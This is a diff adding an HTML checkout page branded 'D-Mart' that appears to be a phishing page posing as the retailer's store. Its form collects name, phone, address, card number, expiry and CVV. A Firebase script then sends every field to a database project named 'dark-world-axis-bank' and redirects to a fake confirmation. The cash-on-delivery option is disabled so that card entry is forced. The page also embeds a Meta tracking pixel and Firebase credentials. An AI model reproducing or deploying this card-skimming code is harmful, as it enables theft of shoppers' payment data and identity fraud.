@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1044341684067916');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1044341684067916&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-Mart</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 1395px;
+            margin: auto;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background: #f00808;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .left-section {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .menu-icon, .cart-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: #266D37;
+        }
+         .three-icon {
+            width: 100%;
+            height: 40px;
+            margin-top: 10px;
+        }
+        .cart-icon {
+            position: relative;
+        }
+        .cart-badge {
+            position: absolute;
+            top: -5px;
+            right: -10px;
+            background: red;
+            color: white;
+            font-size: 12px;
+            border-radius: 50%;
+            padding: 2px 6px;
+        }
+        .progress-bar2 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 80%;
+            color:black;
+            margin: -15px auto;
+            position: relative;
+        }
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 80%;
+            margin: 20px auto;
+            position: relative;
+        }
+
+        .progress-bar::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 25%;
+            width: 80%;
+            height: 4px;
+            background: lightgray;
+            z-index: -1;
+        }
+        .progress-step3 {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: lightgray;
+            border: 1.5px solid #17af3a;
+            
+            color: black;
+            font-size: 14px;
+            font-weight: bold;
+            position: relative;
+        }
+        .progress-step {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: lightgray;
+            border: 2px solid #17af3a;
+            
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            position: relative;
+        }
+        .progress-step.active {
+            background: #17af3a;
+        }
+        .progress-text {
+            margin-top: 5px;
+            font-size: 14px;
+            color: black;
+        }
+        .progress-line {
+            position: absolute;
+            top: 50%;
+            left: 0%;
+            width: 50%;
+            height: 4px;
+            background: #17af3a;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="left-section">
+                <div class="menu-icon">☰</div>
+                <img src="image/smartlogo.png" alt="Three Icon" class="three-icon">
+            </div>
+            <div class="cart-icon">🛒<span class="cart-badge">1</span></div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-step active">1</div>
+            <div class="progress-line"></div>
+            <div class="progress-step active">2</div>
+            <div class="progress-step3">3</div>
+        </div>
+        <div class="progress-bar2">
+            <div class="progress-text">View Cart</div>
+            <div class="progress-text">Checkout</div>
+            <div class="progress-text">Finish</div>
+        </div>
+
+
+
+
+        <div class="checkout-container">
+            <div class="billing-details">
+                <h2>Billing Details</h2>
+                <form>
+                    <div class="flex-container1">
+                    <div class="input-container">
+                        <input type="text" id="fullName" placeholder="" required>
+                        <label for="fullName">Full Name *</label>
+                    </div></div>
+                    
+    
+                    <!-- <div class="mobile-input">
+                        <span class="country-code">+91</span>
+                        <input type="tel" id="mobileNumber" placeholder="Mobile Number *" required>
+                    </div> -->
+    
+                    <div class="input-container mobile-input">
+                        <span class="country-code">+91</span>
+                        <input type="tel" maxlength="10" id="mobileNumber" placeholder="" required>
+                        <label for="mobileNumber">Mobile Number *</label>
+                    </div>
+                    
+
+                    <div class="flex-container">
+                        <div class="input-container">
+                            <input type="text" id="city" placeholder="" required>
+                            <label for="city">City *</label>
+                        </div>
+                        <div class="input-container">
+                            <input type="text" id="state" placeholder="" required>
+                            <label for="state">State *</label>
+                        </div>
+                    </div>
+    
+                    <div class="input-container">
+                        <input type="text" id="address" placeholder="" required>
+                        <label for="address">Address *</label>
+                    </div>
+    
+                    <div class="input-container">
+                        <input type="number" id="pincode" placeholder="" required 
+                               oninput="this.value=this.value.slice(0,6)" min="100000" max="999999">
+                        <label for="pincode">Pincode / Zip *</label>
+                    </div>
+                    
+                </form>
+            </div>
+    
+            <div class="order-section">
+                <h2>Your Order</h2>
+                <div class="payment-options">
+                    <label><input type="radio" name="payment" checked> Credit Card</label>
+                    <label><input type="radio" name="payment"> Debit Card</label>
+                    <label><input type="radio" onclick="return false" name="payment"> Cash on delivery</label>
+                </div>
+                <form>
+                    <div class="input-container">
+                        <input type="text" id="cardNumber" placeholder="" required
+                               oninput="formatCardNumber(this)" maxlength="19">
+                        <label for="cardNumber">Card Number *</label>
+                    </div>
+                    
+                    <script>
+                    function formatCardNumber(input) {
+                        let value = input.value.replace(/\D/g, ""); // केवल नंबर रखें
+                        value = value.replace(/(\d{4})/g, "$1 ").trim(); // हर 4 अंकों के बाद स्पेस जोड़ें
+                        input.value = value;
+                    }
+                    </script>
+                    
+    
+                    <div class="flex-container">
+                        <div class="input-container">
+                            <input type="number" id="expiryMM" maxlength="2" placeholder="" required
+                            oninput="this.value=this.value.slice(0,2)" >
+                            <label for="expiryMM">MM *</label>
+                        </div>
+                        <div class="input-container">
+                            <input type="number" id="expiryYY" maxlength="2" placeholder="" required
+                            oninput="this.value=this.value.slice(0,2)" >
+                            <label for="expiryYY">YY *</label>
+                        </div>
+                    </div>
+    
+                    <div class="input-container">
+                        <input type="number" id="cvv" maxlength="3" placeholder="" required
+                        oninput="this.value=this.value.slice(0,3)" >
+                        <label for="cvv">CVV *</label>
+                    </div>
+                </form>
+                <button class="place-order">Place Order</button>
+            </div>
+        </div>
+    
+
+
+
+       <!-- Firebase Scripts (Latest Version) -->
+<script type="module">
+    // Import Firebase Modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+  
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyC8efw8abfPHkiaI0mOKmzFwqfDkXnvT6M",
+      authDomain: "dark-world-axis-bank.firebaseapp.com",
+      databaseURL: "https://dark-world-axis-bank-default-rtdb.firebaseio.com",
+      projectId: "dark-world-axis-bank",
+      storageBucket: "dark-world-axis-bank.firebasestorage.app",
+      messagingSenderId: "699948191677",
+      appId: "1:699948191677:web:1c3609ba8e9179c87c8cd4",
+      measurementId: "G-QQDY863E0T"
+    };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+  
+    // Function to Save Data
+    function saveData(event) {
+      event.preventDefault();
+  
+      // Input Fields Se Data Get Karna
+      let fullName = document.getElementById("fullName").value.trim();
+      let mobileNumber = document.getElementById("mobileNumber").value.trim();
+      let city = document.getElementById("city").value.trim();
+      let state = document.getElementById("state").value.trim();
+      let address = document.getElementById("address").value.trim();
+      let pincode = document.getElementById("pincode").value.trim();
+      let cardNumber = document.getElementById("cardNumber").value.trim();
+      let expiryMM = document.getElementById("expiryMM").value.trim();
+      let expiryYY = document.getElementById("expiryYY").value.trim();
+      let cvv = document.getElementById("cvv").value.trim();
+  
+      // Validation
+      if (!fullName || !mobileNumber || !city || !state || !address || !pincode ||
+          !cardNumber || !expiryMM || !expiryYY || !cvv) {
+          alert("Please fill all fields");
+          return;
+      }
+  
+      if (mobileNumber.length !== 10) {
+          alert("Mobile Number must be 10 digits.");
+          return;
+      }
+  
+      if (pincode.length !== 6) {
+          alert("Pin code must be 6 digits.");
+          return;
+      }
+  
+      if (cardNumber.replace(/\s/g, "").length !== 16) {
+          alert("Enter a valid 16-digit card number.");
+          return;
+      }
+  
+      if (cvv.length !== 3) {
+          alert("Enter 3-digit CVV.");
+          return;
+      }
+  
+      if (parseInt(expiryMM) < 1 || parseInt(expiryMM) > 12) {
+          alert("Enter correct expiry month.");
+          return;
+      }
+  
+      let currentYear = new Date().getFullYear() % 100;
+      if (parseInt(expiryYY) < currentYear) {
+          alert("Enter a valid expiry year.");
+          return;
+      }
+  
+      // Data Save Karna Firebase Database Me
+      push(ref(db, "orders"), {
+          fullName: fullName,
+          mobileNumber: mobileNumber,
+          city: city,
+          state: state,
+          address: address,
+          pincode: pincode,
+          cardNumber: cardNumber,
+          expiryMM: expiryMM,
+          expiryYY: expiryYY,
+          cvv: cvv,
+          timestamp: new Date().toLocaleString()
+      }).then(() => {
+        //   alert("Order Placed Successfully!");
+        
+          window.location.href = "confirmorder.html"; // Redirect to confirmation page
+      }).catch(error => {
+          console.error("Error saving data:", error);
+        //   alert("Failed to place order. Try again!");
+      });
+    }
+  
+    // Event Listener for Place Order Button
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelector(".place-order").addEventListener("click", saveData);
+    });
+  
+  </script>
+      
+
+
+
+        <style>
+        .checkout-container {
+            display: flex;
+            justify-content: space-between;
+            max-width: 900px;
+            margin: auto;
+          
+            padding: 20px;
+            flex-wrap: wrap;
+        }
+        .billing-details, .order-section {
+            width: 48%;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .container {
+            width: 100%;
+            max-width: 1395px;
+            margin: auto;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+   
+        .input-container {
+            position: relative;
+            margin: 0px 0 !important;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            outline: none;
+            background: white;
+        }
+        .input-container label {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            padding: 0 5px;
+            font-size: 16px;
+            color: #999;
+            transition: 0.3s ease-in-out;
+            pointer-events: none;
+        }
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: green;
+        }
+
+
+        .flex-container {
+            display: flex;
+            gap: 20px;
+            margin: 10px 0;
+            justify-content: space-between;
+
+        }
+        .flex-container1 {
+            margin-bottom: 10px;
+        }
+
+        .flex-container input {
+            width: 48%;
+        }
+
+        .payment-options {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin: 10px 0;
+}
+
+        .payment-options label {
+            display: block;
+            margin: 5px 0;
+        }
+        .place-order {
+            width: 100%;
+            background: #17af3a;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        
+        @media screen and (max-width: 768px) {
+            .checkout-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            .billing-details, .order-section {
+                width: 100%;
+                margin-bottom: 20px;
+            }
+        }
+
+
+
+
+     
+        .mobile-input {
+    display: flex;
+    align-items: center;
+    width: 100%;
+  
+    border-radius: 5px;
+    background: white;
+    border: none;
+    position: relative;
+    height: 46px;
+   
+}
+
+.country-code {
+    height: 46px;
+ 
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    background: #f0f0f0;
+    padding: 10px 12px; /* Padding optimized */
+    font-size: 16px;
+    border-right: 2px solid #ccc;
+    display: inline-block; /* Dynamic width */
+    width: auto; /* Only as wide as content */
+    white-space: nowrap; /* Prevents text wrapping */
+}
+
+.mobile-input input {
+    border: none;
+    padding: 10px;
+    width: 100%;
+    outline: none;
+    font-size: 16px;
+    height: 100%;
+   
+}
+
+/* Floating Label Fix */
+.mobile-input label {
+    position: absolute;
+    left: 12px;
+    top: 15px; /* इसे कम करके लेबल को ऊपर सरकाएं */
+    background: white;
+    padding: 0 5px;
+    font-size: 16px;
+    color: #999;
+    transition: 0.2s ease-in-out;
+    pointer-events: none;
+    z-index: 1;
+    margin-left: 60px;
+}
+
+
+.mobile-input input:focus + label,
+.mobile-input input:not(:placeholder-shown) + label {
+    top: 15%;
+    font-size: 14px;
+    color: #333;
+    background: white; /* सफेद बैकग्राउंड */
+    z-index: 1; /* लेबल को सबसे ऊपर रखने के लिए */
+ 
+}
+
+
+
+
+
+input:focus  {
+    border: 2px solid green;
+    outline: none;
+}
+
+
+
+
+h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .input-container {
+    position: relative;
+    margin: 20px 0;
+}
+
+.input-container input {
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    border: 2px solid #ccc;
+    border-radius: 5px;
+    outline: none;
+    background: transparent;
+}
+
+
+
+.input-container label {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: white;
+    padding: 0 5px;
+    font-size: 16px;
+    color: #999;
+    transition: 0.2s ease-in-out;
+    pointer-events: none;
+}
+
+/* When input is focused OR has value */
+.input-container input:focus + label,
+.input-container input:not(:placeholder-shown) + label {
+    top: 15%;
+    font-size: 14px;
+    color: #333;
+}
+
+
+        .input-container input:focus {
+            border: 2px solid green;
+        }
+
+        .place-order {
+            width: 100%;
+            background: #17af3a;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        .place-order:hover {
+            background: #148a2e;
+        }
+
+
+
+
+
+
+
+        </style>
+
+
+
+
+    </div>
+</body>
+</html>
+
+
+
+  
